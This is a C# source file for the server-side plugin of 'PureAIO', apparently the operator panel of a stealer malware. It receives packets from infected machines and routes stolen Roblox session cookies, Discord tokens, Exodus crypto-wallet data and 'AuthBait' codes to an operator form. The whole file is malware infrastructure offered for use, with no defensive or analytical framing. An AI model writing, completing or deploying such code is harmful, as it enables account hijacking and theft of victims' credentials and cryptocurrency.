// PureAIO ServerPlugin — ICustomPlugin implementation.
// Receives packets from the client, deserializes them, and routes to Form1.

using System;
using System.IO;
using PluginSDK.Interfaces;
using PluginSDK.Packets;
using ProtoBuf;

namespace PureAIO
{
    public class ServerPlugin : ICustomPlugin
    {
        private Form1 _form;
        private Action<IPacket> _send;

        // ── ICustomPlugin ─────────────────────────────────────────────────────
        public string PluginName        => "PureAIO";
        public string PluginVersion     => "2.0.0";
        public string PluginAuthor      => "Sam";
        public string PluginDescription => "AuthBait + Roblox Cookie + Discord Token + Exodus (enriched)";

        public bool OnOpen(string title)
        {
            _form = new Form1();
            _form.Show();
            return true;
        }

        public void OnConnected(Action<IPacket> send, Action disconnect)
        {
            _send = send;
            _form?.SetSend(send);
        }

        public void OnDisconnected()
        {
            _send = null;
            if (_form != null && !_form.IsDisposed)
            {
                _form.OnDisconnected();
            }
            _form = null;
        }

        public void OnPacketReceived(IPacket packet)
        {
            var cp = packet as CustomPacket;
            if (cp == null || _form == null || _form.IsDisposed) return;

            AIOPacket pkt;
            try
            {
                using (var ms = new MemoryStream(cp.Buffer))
                    pkt = Serializer.Deserialize<AIOPacket>(ms);
            }
            catch { return; }

            switch (pkt)
            {
                case AuthBaitCodeResponse r:
                    _form.HandleAuthBaitResponse(r);
                    break;
                case RobloxCookieResponse r:
                    _form.HandleCookieResponse(r);
                    break;
                case DiscordTokenResponse r:
                    _form.HandleTokenResponse(r);
                    break;
                case ExodusResponse r:
                    _form.HandleExodusResponse(r);
                    break;
            }
        }

        // ── Serialization helpers ─────────────────────────────────────────────
        public static byte[] Serialize(AIOPacket pkt)
        {
            using (var ms = new MemoryStream())
            {
                Serializer.Serialize(ms, pkt);
                return ms.ToArray();
            }
        }

        public static AIOPacket Deserialize(MemoryStream ms)
            => Serializer.Deserialize<AIOPacket>(ms);
    }
}
